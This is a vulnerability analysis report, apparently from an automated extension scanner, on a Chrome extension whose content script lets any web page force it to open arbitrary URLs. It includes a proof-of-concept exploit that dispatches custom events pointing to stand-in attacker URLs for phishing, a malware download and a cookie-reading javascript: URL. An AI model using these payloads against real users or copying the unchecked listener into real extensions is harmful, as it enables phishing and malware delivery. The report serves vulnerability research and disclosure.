# CoCo Analysis: klfnhdgbkpajadkokakemnbipikkjifj

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 3 flows (document_eventListener_start-doubleclue-addon → chrome_storage_local_set_sink, plus chrome_storage_local_clear_sink)

---

## Sink: document_eventListener_start-doubleclue-addon → chrome_storage_local_set_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/klfnhdgbkpajadkokakemnbipikkjifj/opgen_generated_files/cs_0.js
Line 471     document.addEventListener("start-doubleclue-addon", function(e) {
Line 473     if(e.detail.admin){
Line 473     e.detail.admin

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/klfnhdgbkpajadkokakemnbipikkjifj/opgen_generated_files/bg.js
Line 1150    chrome.storage.local.set({ 'url': request.admin.u }, function () {
Line 1127    chrome.storage.local.set({ 'url': request.action.u }, function () {
Line 1170    chrome.storage.local.set({ 'url': request.customapp.u }, function () {
```

**Code:**

```javascript
// Content script (cs_0.js) - DOM event listener
document.addEventListener("start-doubleclue-addon", function(e) {
    try {
        if(e.detail.admin){
            chrome.runtime.sendMessage({'admin': e.detail.admin});  // ← Forwards attacker data to background
        }
        else if (e.detail.action){
            chrome.runtime.sendMessage({'action': e.detail.action});  // ← Forwards attacker data to background
        }
        else if (e.detail.customapp){
            chrome.runtime.sendMessage({'customapp': e.detail.customapp});  // ← Forwards attacker data to background
        }
    } catch (error) {
        console.log(error);
    }
});

// Background script (bg.js) - Message handler
chrome.runtime.onMessage.addListener(
    function (request, sender, sendResponse) {
        if (request.admin) {
            chrome.storage.local.clear(function () {
                var error = chrome.runtime.lastError;
                if (error) {
                    console.error(error);
                }
            });
            chrome.storage.local.set({ 'admin': true }, function () {
                chrome.storage.local.set({ 'startExecution': true }, function () {
                    chrome.storage.local.set({ 'url': request.admin.u }, function () {  // ← Stores attacker URL
                        sendResponse({ response: true });
                        chrome.tabs.query({ active: true }, function (tabs) {
                            chrome.storage.local.set({ 'dc_tabId': tabs[0].id }, function () {
                                chrome.tabs.create({ url: request.admin.u });  // ← Opens attacker-controlled URL!
                            });
                        });
                    });
                });
            });
        }
        if (request.action) {
            chrome.storage.local.clear(function () {
                var error = chrome.runtime.lastError;
                if (error) {
                    console.error(error);
                }
            });
            chrome.storage.local.set({ 'action': true }, function () {
                chrome.storage.local.set({ 'startExecution': true }, function () {
                    chrome.storage.local.set({ 'url': request.action.u }, function () {  // ← Stores attacker URL
                        sendResponse({ response: true });
                        chrome.tabs.query({ active: true }, function (tabs) {
                            chrome.storage.local.set({ 'dc_tabId': tabs[0].id }, function () {
                                chrome.tabs.create({ url: request.action.u });  // ← Opens attacker-controlled URL!
                            });
                        });
                    });
                });
            });
        }
        if (request.customapp) {
            chrome.storage.local.clear(function () {
                var error = chrome.runtime.lastError;
                if (error) {
                    console.error(error);
                }
            });
            chrome.storage.local.set({ 'customapp': true }, function () {
                chrome.storage.local.set({ 'startExecution': true }, function () {
                    chrome.storage.local.set({ 'url': request.customapp.u }, function () {  // ← Stores attacker URL
                        sendResponse({ response: true });
                        chrome.tabs.query({ active: true }, function (tabs) {
                            chrome.storage.local.set({ 'dc_tabId': tabs[0].id }, function () {
                                chrome.tabs.create({ url: request.customapp.u });  // ← Opens attacker-controlled URL!
                            });
                        });
                    });
                });
            });
        }
    }
);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event listener (document.addEventListener)

**Attack:**

```javascript
// Malicious webpage dispatches custom event to trigger extension
var event = new CustomEvent("start-doubleclue-addon", {
    detail: {
        admin: {
            u: "https://attacker.com/phishing"  // ← Attacker-controlled URL
        }
    }
});
document.dispatchEvent(event);

// Alternative attack vectors:
// 1. Action variant
var event2 = new CustomEvent("start-doubleclue-addon", {
    detail: {
        action: {
            u: "https://attacker.com/malware.exe"
        }
    }
});
document.dispatchEvent(event2);

// 2. Custom app variant
var event3 = new CustomEvent("start-doubleclue-addon", {
    detail: {
        customapp: {
            u: "javascript:alert(document.cookie)"  // ← Potential code execution
        }
    }
});
document.dispatchEvent(event3);
```

**Impact:** Arbitrary URL opening vulnerability. An attacker-controlled website can force the extension to open arbitrary URLs in new tabs by dispatching a custom DOM event. This enables multiple attack scenarios:
1. **Phishing**: Force opening phishing pages to steal user credentials
2. **Malware distribution**: Force downloading malicious files via direct download URLs
3. **Drive-by downloads**: Exploit browser vulnerabilities via carefully crafted URLs
4. **Privacy invasion**: Track users by forcing connections to attacker-controlled tracking domains
5. **Potential code execution**: If chrome.tabs.create accepts javascript: URLs (browser-dependent), could enable XSS

The extension has the required permissions ("tabs", "storage") to execute this attack. The content script runs on all URLs ("<all_urls>"), making any website a potential attack vector.
